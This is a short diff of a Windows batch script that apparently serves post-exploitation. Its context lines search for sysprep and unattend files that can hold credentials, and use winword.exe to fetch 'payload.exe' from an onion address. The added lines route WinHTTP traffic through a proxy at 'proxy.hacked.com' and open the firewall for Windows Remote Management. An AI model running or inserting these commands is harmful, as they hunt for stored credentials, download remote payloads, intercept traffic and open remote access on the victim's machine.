@@ -511,7 +511,9 @@ dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>n
 ECHO ============================
 winword.exe http://bcdyzitklmnprti.onion/payload.exe
 ECHO ============================
-netsh winhttp set proxy "proxy.mydomain.com:8080"; 127.0.0.1,localhost
+netsh winhttp set proxy "proxy.hacked.com:8080"; 127.0.0.1,localhost
+ECHO ============================
+netsh advfirewall firewall set rule group=”Windows Remote Management” new enable=yes
 ECHO ============================
 netsh winhttp reset proxy
 ECHO ============================
